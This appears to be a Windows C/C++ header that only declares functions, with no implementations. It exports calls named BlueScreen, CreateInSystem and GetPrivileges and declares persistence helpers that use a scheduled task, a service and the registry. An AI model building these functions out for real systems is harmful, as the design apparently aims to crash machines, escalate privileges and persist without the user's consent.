#define _WIN32_WINNT 0x601
#include <windows.h>
#include<stdio.h>
#include <lm.h> 
#include<time.h>
#include <windows.h>
#include <tlhelp32.h>
#include<stdlib.h>
#include <iostream>
#include<string.h>
#include <fstream>
#include <io.h>
#include<stdbool.h>
#include <taskschd.h>
#include <comdef.h> 
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
extern "C" __declspec(dllexport)void BlueScreen();
extern "C" __declspec(dllexport)BOOL CreateInSystem(LPWSTR processName);
extern "C" __declspec(dllexport)BOOL GetPrivileges();
BOOL ITaskToStartup(const std::wstring& appPath);
BOOL ServiceAddStartup(LPCTSTR serviceName, LPCTSTR displayName, LPCTSTR binaryPath);
BOOL RootKeyAddStartup(LPCTSTR lpApplicationName, LPCTSTR lpKeyName);
int GetProcessPermission();